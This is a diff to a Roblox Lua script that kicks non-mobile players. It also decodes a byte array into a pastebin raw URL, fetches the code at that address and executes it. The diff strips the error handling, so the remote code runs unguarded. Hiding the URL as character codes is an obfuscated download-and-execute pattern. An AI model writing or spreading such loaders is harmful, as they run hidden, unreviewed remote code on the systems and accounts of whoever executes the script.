@@ -3,35 +3,21 @@ local l1l1ll1 = game:GetService("Players").LocalPlayer
 local UIS = game:GetService("UserInputService")
 
 local function checkMobile()
-    local isMobile = (UIS.TouchEnabled and not UIS.KeyboardEnabled)
-    if not isMobile or UIS.MouseEnabled then
-        return false
-    end
-    return true
+    return (UIS.TouchEnabled and not UIS.KeyboardEnabled) and not UIS.MouseEnabled
 end
 
 if not checkMobile() then
-    l1l1ll1:Kick("Tampering")
+    l1l1ll1:Kick("Mobile Only Script")
     return
 end
 
 _G.SESSION_TOKEN = math.random(100000, 999999)
 _G.Processor = math.random(1000, 9000)
-
-repeat
-    task.wait(0.1)
-until _G.SESSION_TOKEN and _G.Processor
+shared.SESSION_TOKEN = _G.SESSION_TOKEN
+shared.Processor = _G.Processor
 
 local _raw = {104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 119, 50, 109, 115, 66, 76, 113, 51}
 local _url = ""
-for i = 1, #_raw do
-    _url = _url .. string.char(_raw[i])
-end
+for i = 1, #_raw do _url = _url .. string.char(_raw[i]) end
 
-local s, err = pcall(function()
-    loadstring(game:HttpGet(_url))()
-end)
-
-if not s then
-    l1l1ll1:Kick("Tampering")
-end
+loadstring(game:HttpGet(_url))()
